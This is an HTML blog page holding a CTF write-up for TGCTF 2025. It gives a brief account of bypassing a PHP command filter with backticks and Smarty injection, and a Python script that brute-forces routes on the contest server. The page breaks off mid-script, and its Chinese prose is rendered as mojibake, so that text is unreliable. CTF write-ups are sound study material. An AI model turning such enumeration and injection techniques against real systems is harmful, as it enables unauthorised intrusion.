<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" web ç«çœ¼è¾©é­‘é­… è¿›å»è¯´shellå­¦å§ï¼Œæ˜¾ç„¶è®¿é—®tgshellã€‚\nç›´æ¥æ‰“phpinfo();å‘ç°å‘½ä»¤å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ç»§ç»­æ‰§è¡Œå‘ç°ç¦äº†å¾ˆå¤šï¼Œä½†æ˜¯å‘ç°åå¼•å·æ²¡ç¦ã€‚\n">
<title>2025-TGCTF-write.up</title>

<link rel='canonical' href='https://luo-kaihong.github.io/p/2025-tgctf-write.up/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="2025-TGCTF-write.up">
<meta property='og:description' content=" web ç«çœ¼è¾©é­‘é­… è¿›å»è¯´shellå­¦å§ï¼Œæ˜¾ç„¶è®¿é—®tgshellã€‚\nç›´æ¥æ‰“phpinfo();å‘ç°å‘½ä»¤å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ç»§ç»­æ‰§è¡Œå‘ç°ç¦äº†å¾ˆå¤šï¼Œä½†æ˜¯å‘ç°åå¼•å·æ²¡ç¦ã€‚\n">
<meta property='og:url' content='https://luo-kaihong.github.io/p/2025-tgctf-write.up/'>
<meta property='og:site_name' content='ç½—é“ é¸¿'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-04-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-12T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="2025-TGCTF-write.up">
<meta name="twitter:description" content=" web ç«çœ¼è¾©é­‘é­… è¿›å»è¯´shellå­¦å§ï¼Œæ˜¾ç„¶è®¿é—®tgshellã€‚\nç›´æ¥æ‰“phpinfo();å‘ç°å‘½ä»¤å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ç»§ç»­æ‰§è¡Œå‘ç°ç¦äº†å¾ˆå¤šï¼Œä½†æ˜¯å‘ç°åå¼•å·æ²¡ç¦ã€‚\n">
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ’—</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ç½—é“ é¸¿</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
                        target="_blank"
                        title="csdn"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#web">web</a>
      <ol>
        <li><a href="#ç«çœ¼è¾©é­‘é­…"><strong>ç«çœ¼è¾©é­‘é­…</strong></a></li>
        <li><a href="#ç›´é¢å¤©å‘½"><strong>ç›´é¢å¤©å‘½</strong></a>
          <ol>
            <li><a href="#è§£æ³•ä¸€ssti">è§£æ³•ä¸€ï¼šssti</a></li>
            <li><a href="#è§£æ³•äºŒç›®å½•ç©¿è¶Š">è§£æ³•äºŒï¼šç›®å½•ç©¿è¶Š</a></li>
          </ol>
        </li>
        <li><a href="#ç›´é¢å¤©å‘½å¤ä»‡"><strong>ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰</strong></a></li>
        <li><a href="#aaaå·æ¸¡é˜´å¹³æ— å­—æ¯æ•°å­—rce"><strong>AAAå·æ¸¡é˜´å¹³</strong>ï¼ˆæ— å­—æ¯æ•°å­—rceï¼‰</a>
          <ol>
            <li><a href="#è§£æ³•ä¸€get_defined_vars">è§£æ³•ä¸€ï¼šget_defined_vars()</a></li>
            <li><a href="#è§£æ³•äºŒgetallheaders">è§£æ³•äºŒï¼šgetallheaders()</a></li>
            <li><a href="#è§£æ³•ä¸‰session_id">è§£æ³•ä¸‰ï¼šsession_id()</a></li>
          </ol>
        </li>
        <li><a href="#aaaå·æ¸¡é˜´å¹³å¤ä»‡"><strong>AAAå·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰</strong></a>
          <ol>
            <li><a href="#éé¢„æœŸ">éé¢„æœŸ</a></li>
          </ol>
        </li>
        <li><a href="#å‰ç«¯game"><strong>å‰ç«¯GAME</strong></a></li>
        <li><a href="#å‰ç«¯game-plus"><strong>å‰ç«¯GAME Plus</strong></a></li>
        <li><a href="#å‰ç«¯game-ultra"><strong>å‰ç«¯GAME Ultra</strong></a></li>
        <li><a href="#ezupload"><strong>(ez)upload</strong></a>
          <ol>
            <li><a href="#ç¬¬ä¸€ç§æ‰“ä¸€å¥è¯æœ¨é©¬">ç¬¬ä¸€ç§ï¼šæ‰“ä¸€å¥è¯æœ¨é©¬</a></li>
            <li><a href="#ç¬¬äºŒç§è„æ•°æ®ç»•è¿‡">ç¬¬äºŒç§ï¼šè„æ•°æ®ç»•è¿‡</a></li>
          </ol>
        </li>
        <li><a href="#ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ "><strong>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ</strong></a></li>
        <li><a href="#ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ å¤ä»‡"><strong>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿï¼ˆå¤ä»‡ï¼‰</strong></a></li>
        <li><a href="#è€ç™»ç‚¸é±¼æ¥äº†"><strong>è€ç™»ï¼Œç‚¸é±¼æ¥äº†ï¼Ÿ</strong></a></li>
        <li><a href="#ç†Ÿæ‚‰çš„é…æ–¹ç†Ÿæ‚‰çš„å‘³é“"><strong>ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“</strong></a>
          <ol>
            <li><a href="#æ‰“pyramidå†…å­˜é©¬">æ‰“pyramidå†…å­˜é©¬</a></li>
            <li><a href="#æ‰“æ—¶é—´ç›²æ³¨">æ‰“æ—¶é—´ç›²æ³¨</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#cry">Cry</a>
      <ol>
        <li><a href="#è´¹å…‹ç‰¹å°”"><strong>è´¹å…‹ç‰¹å°”</strong></a></li>
        <li><a href="#mmä¸èº²çŒ«çŒ«"><strong>mmä¸èº²çŒ«çŒ«</strong></a></li>
        <li><a href="#trwsians"><strong>tRwSiAns</strong></a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/write.up/" style="background-color: #2a9d8f; color: #fff;">
                write.up
            </a>
        
            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
                web
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/2025-tgctf-write.up/">2025-TGCTF-write.up</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-04-12</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 27 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <hr>
<h2 id="web">web
</h2><h3 id="ç«çœ¼è¾©é­‘é­…"><strong>ç«çœ¼è¾©é­‘é­…</strong>
</h3><img src="image-20250412111717648.png" alt="image-20250412111717648" style="zoom:50%;" />
<p>è¿›å»è¯´shellå­¦å§ï¼Œæ˜¾ç„¶è®¿é—®tgshellã€‚</p>
<p>ç›´æ¥æ‰“phpinfo();å‘ç°å‘½ä»¤å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ç»§ç»­æ‰§è¡Œå‘ç°ç¦äº†å¾ˆå¤šï¼Œä½†æ˜¯å‘ç°åå¼•å·æ²¡ç¦ã€‚</p>
<img src="image-20250412170442114.png" alt="image-20250412170442114" style="zoom:50%;" />
<img src="image-20250412170527774.png" alt="image-20250412170527774" style="zoom:50%;" />
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ä½†æ˜¯ä¸Šé¢ç«Ÿç„¶æ˜¯éé¢„æœŸï¼Œwpæ˜¯æ‰“smartyæ¨¡æ¿æ³¨å…¥ï¼ˆçœ‹æ¡†æ¶æ˜¯phpç„¶åè”ç³»ipå¯ä»¥æƒ³åˆ°åœ¨xffæ‰“Smartyæ¨¡æ¿æ³¨å…¥ï¼‰
</span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250416091552111.png" alt="image-20250416091552111" style="zoom:50%;" />
<h3 id="ç›´é¢å¤©å‘½"><strong>ç›´é¢å¤©å‘½</strong>
</h3><p>æç¤ºæœ‰ä¸ªè·¯ç”±ï¼Œçœ‹æè¿°ä¸å‡ºæ„å¤–æ˜¯çˆ†ç ´è·¯ç”±ï¼Œç”¨bpçˆ†å¤ªæ…¢äº†ï¼Œç›´æ¥aiå†™ä¸ªä»£ç çˆ†ï¼Œå¾—åˆ°aazz</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ===== ç›®æ ‡é…ç½® =====</span>
</span></span><span class="line"><span class="cl"><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&#34;http://node2.tgctf.woooo.tech:32668&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">THREADS</span> <span class="o">=</span> <span class="mi">30</span>  <span class="c1"># å¹¶å‘çº¿ç¨‹æ•°</span>
</span></span><span class="line"><span class="cl"><span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">5</span>  <span class="c1"># è¯·æ±‚è¶…æ—¶(ç§’)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ===== è·¯ç”±ç”Ÿæˆå™¨ =====</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_routes</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">combo</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">chars</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="s1">&#39;/&#39;</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">combo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ===== æœ‰æ•ˆæ€§éªŒè¯ =====</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_route</span><span class="p">(</span><span class="n">route</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">TARGET</span> <span class="o">+</span> <span class="n">route</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># æœ‰æ•ˆæ€§åˆ¤æ–­é€»è¾‘ï¼ˆç»¼åˆçŠ¶æ€ç å’Œå†…å®¹ç‰¹å¾ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># è¿‡æ»¤é»˜è®¤é¡µé¢/æ— æ•ˆé¡µé¢ï¼ˆå‚è€ƒç½‘é¡µ1çš„&#34;var resultInfo&#34;é€»è¾‘ï¼‰</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="ow">and</span> <span class="s2">&#34;404&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="n">route</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ===== ä¸»çˆ†ç ´é€»è¾‘ =====</span>
</span></span><span class="line"><span class="cl"><span class="n">found_routes</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brute_worker</span><span class="p">(</span><span class="n">route</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">found_routes</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">found_routes</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">valid</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="n">check_route</span><span class="p">(</span><span class="n">route</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">valid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">found_routes</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">path</span><span class="p">,</span> <span class="n">length</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[32m[+] å‘ç°æœ‰æ•ˆè·¯ç”±: </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> (å“åº”é•¿åº¦: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">)</span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># æ‰¾åˆ°ä¸¤ä¸ªç«‹å³åœæ­¢</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">found_routes</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">executor</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="n">wait</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">cancel_futures</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ===== æ‰§è¡Œçˆ†ç ´ =====</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
